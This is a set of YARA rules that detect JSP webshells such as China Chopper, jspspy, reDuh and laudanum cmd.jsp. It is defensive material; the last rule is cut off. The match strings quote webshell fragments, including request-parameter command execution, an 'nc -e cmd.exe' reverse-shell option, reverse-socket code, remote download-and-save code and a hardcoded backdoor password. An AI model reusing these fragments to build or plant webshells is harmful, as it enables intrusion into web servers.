rule Backdoor_Webshell_JSP_000573
{
    meta:
        description = "a tiny webshell chine chopper.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-12-05"
        
    strings:
        $s1 = "<%eval(Request(" nocase
        
    condition:
        uint16(0) == 0x253c and filesize < 40 and all of them
}
rule Backdoor_Webshell_JSP_000574
{
    meta:
        description = "laudanum injector tools cmd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
        $s4 = "String disr = dis.readLine();" fullword ascii
        
    condition:
        filesize < 2KB and all of them
}
rule Backdoor_Webshell_JSP_000575
{
    meta:
        description = "cn honker pentest toolset jsp.html"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "<input name=f size=30 value=shell.jsp>" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "<font color=red>www.i0day.com  By:" fullword ascii
        
    condition:
        filesize < 3KB and all of them
}
rule Backdoor_Webshell_JSP_000576
{
    meta:
        description = "cn honker pentest toolset jspmssql.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "<form action=\"?action=operator&cmd=execute\"" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "String sql = request.getParameter(\"sqlcmd\");" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 35KB and all of them
}
rule Backdoor_Webshell_JSP_000577
{
    meta:
        description = "cn honker pentest toolset oracle.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "String user=\"oracle_admin\";" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii
        
    condition:
        filesize < 7KB and all of them
}
rule Backdoor_Webshell_JSP_000578
{
    meta:
        description = "cn honker pentest toolset jsp2.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "final String remoteIP =request.getParameter(\"remoteIP\");" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "final String localIP = request.getParameter(\"localIP\");" fullword ascii /* PEStudio Blacklist: strings */
        $s20 = "final String localPort = \"3390\";//request.getParameter(\"localPort\");" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 23KB and all of them
}
rule Backdoor_Webshell_JSP_000579
{
    meta:
        description = "cn honker pentest toolset jspshell2.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s10 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii /* PEStudio Blacklist: strings */
        $s11 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 424KB and all of them
}
rule Backdoor_Webshell_JSP_000580
{
    meta:
        description = "cn honker pentest toolset jsp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 1KB and all of them
}
rule Backdoor_Webshell_JSP_000581
{
    meta:
        description = "cn honker pentest toolset jspshell.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce" ascii /* PEStudio Blacklist: strings */
        $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 30KB and all of them
}
rule Backdoor_Webshell_JSP_000582
{
    meta:
        description = "chinese hacktool cmd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
        $s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
        $s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
        $s4 = "while((a=in.read(b))!=-1){" fullword ascii
        $s5 = "out.println(new String(b));" fullword ascii
        $s6 = "out.print(\"</pre>\");" fullword ascii
        $s7 = "out.print(\"<pre>\");" fullword ascii
        $s8 = "int a = -1;" fullword ascii
        $s9 = "byte[] b = new byte[2048];" fullword ascii
        
    condition:
        filesize < 3KB and 7 of them
}
rule Backdoor_Webshell_JSP_000583
{
    meta:
        description = "chinese hacktool reduh.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
        $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
        $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
        
    condition:
        filesize < 116KB and all of them
}
rule Backdoor_Webshell_JSP_000584
{
    meta:
        description = "chinese hacktool 014.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
        $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
        
    condition:
        filesize < 715KB and all of them
}
rule Backdoor_Webshell_JSP_000585
{
    meta:
        description = "chinese hacktool customize.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
        $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
        
    condition:
        filesize < 30KB and all of them
}
rule Backdoor_Webshell_JSP_000586
{
    meta:
        description = "chinese hacktool 2015.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
        $s4 = "System.out.println(Oute.toString());" fullword ascii
        $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
        $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
        $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
        
    condition:
        filesize < 7KB and all of them
}
rule Backdoor_Webshell_JSP_000587
{
    meta:
        description = "chinese hacktool jspcmd.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-14"
        
    strings:
        $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
        $s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
        
    condition:
        filesize < 1KB and 1 of them
}
rule Backdoor_Webshell_JSP_000588
{
    meta:
        description = "chinese hacktool jsp.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-14"
        
    strings:
        $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
        $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
        $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
        
    condition:
        filesize < 715KB and 2 of them
}
rule Backdoor_Webshell_JSP_000589
{
    meta:
        description = "jspspyweb.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
        $s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000590
{
    meta:
        description = "12302.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>"
        $s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>"
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000591
{
    meta:
        description = "up.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 = "// BUG: Corta el fichero si es mayor de 640Ks"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000592
{
    meta:
        description = "guige.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000593
{
    meta:
        description = "system.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000594
{
    meta:
        description = "hsxa.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000595
{
    meta:
        description = "utils.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);"
        $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000596
{
    meta:
        description = "web.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000597
{
    meta:
        description = "jspshell.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
        $s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000598
{
    meta:
        description = "list1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
        $s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000599
{
    meta:
        description = "123.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
        $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
        $s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    "
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000600
{
    meta:
        description = "cmd_win32.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
        $s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000601
{
    meta:
        description = "jshell.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "kXpeW[\""
        $s4 = "[7b:g0W@W<"
        $s5 = "b:gHr,g<"
        $s8 = "RhV0W@W<"
        $s9 = "S_MR(u7b"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000602
{
    meta:
        description = "zx.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000603
{
    meta:
        description = "k8cmd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000604
{
    meta:
        description = "cmd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");"
        $s2 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_JSP_000605
{
    meta:
        description = "k81.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);"
        $s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_JSP_000606
{
    meta:
        description = "java shell.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "public JythonShell(int columns, int rows, int scrollback) {"
        $s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_JSP_000607
{
    meta:
        description = "ixrbe.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000608
{
    meta:
        description = "tree.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
        $s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000609
{
    meta:
        description = "list.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">"
        $s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
        $s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000610
{
    meta:
        description = "customize.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000611
{
    meta:
        description = "sys3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">"
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
        $s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000612
{
    meta:
        description = "guige02.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
        $s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000613
{
    meta:
        description = "hsxa1.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000614
{
    meta:
        description = "cmdjsp.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);"
        $s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000615
{
    meta:
        description = "spjspshell.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000616
{
    meta:
        description = "action.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";"
        $s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000617
{
    meta:
        description = "jdbc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000618
{
    meta:
        description = "minupload.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   "
        $s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000619
{
    meta:
        description = "asd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>"
        $s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000620
{
    meta:
        description = "inback3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000621
{
    meta:
        description = "config.jsp, myxx.jsp, zend.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000622
{
    meta:
        description = "browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
        $s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000623
{
    meta:
        description = "jspspy"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";"
        $s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {"
        $a0 = "\"<form action=\\\"\"+SHELL_NAME+\"?o=upload\\\" method=\\\"POST\\\" enctype="
        $a1 = "<option value='reg query \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\T"
        
    condition:
        all of ($s*) or all of ($a*)
}
rule Backdoor_Webshell_JSP_000624
{
    meta:
        description = "2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
        $s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000625
{
    meta:
        description = "000.jsp, 403.jsp, c5.jsp, querydong.jsp, spyjsp2010.jsp, t00ls.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
        $s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000626
{
    meta:
        description = "404.jsp, data.jsp, suiyue.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000627
{
    meta:
        description = "jspspy_xxx.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
        $s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
        $s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000628
{
    meta:
        description = "201.jsp, 3.jsp, ma.jsp, download.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
        $s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
        $s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000629
{
    meta:
        description = "jfolder01_filemanager.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);"
        $s1 = "long time = (System.currentTimeMillis() - starttime) / 1000l;"
        $a0 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
        $a1 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
        
    condition:
        all of ($s*) or all of ($a*)
}
rule Backdoor_Webshell_JSP_000630
{
    meta:
        description = "2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
        $s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
        $s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000631
{
    meta:
        description = "807.jsp, dm.jsp, jspspyjdk5.jsp, m.jsp, cofigrue.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");"
        $s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_JSP_000632
{
    meta:
        description = "404_data_in_jfolder.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
        
    condition:
        all of them
}
rule Backdoor_Webshell_JSP_000633
{
    meta:
        description = "jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));"
        $s1 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());"
        $s2 = "isr = new BufferedReader(new InputStreamReader(is));"
        
        $a0 = "// backdoor.jsp"
        $a1 = "JSP Backdoor Reverse Shell"
        $a2 = "http://michaeldaw.org"
        
    condition:
        all of ($s*) or 2 of ($a*)
}
rule Backdoor_Webshell_JSP_000634
{
    meta:
        description = "400.jsp, in.jsp, jfolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");"
        $s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;"
        $s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");"
        $s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000635
{
    meta:
        description = "2.jsp, 520.jsp, job.jsp, jspwebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {"
        $s6 = "password = (String)session.getAttribute(\"password\");"
        $s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000636
{
    meta:
        description = "he1p.jsp, jspspy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, jspspy.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+"
        $s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
        $s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";"
        $s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000637
{
    meta:
        description = "000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, querydong.jsp, spyjsp2010.jsp, zend.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s0 = "return new Double(format.format(value)).doubleValue();"
        $s5 = "File tempF = new File(savePath);"
        $s9 = "if (tempF.isDirectory()) {"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_JSP_000638
{
    meta:
        description = "css_dm_he1p_xxx.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        super_rule = 1
        
    strings:
        $s3 = "String savePath = request.getParameter(\"savepath\");"
        $s4 = "URL downUrl = new URL(downFileUrl);"
        $s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))"
        $s6 = "String downFileUrl = request.getParameter(\"url\");"
        $s7 = "FileInputStream fInput = new FileInputStream(f);"
        $s8 = "URLConnection conn = downUrl.openConnection();"
        $s9 = "sis = request.getInputStream();"
        
    condition:
        4 of them
}
rule Backdoor_Webshell_JSP_000639
{
    meta:
        description = "2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
        company = "WatcherLab"
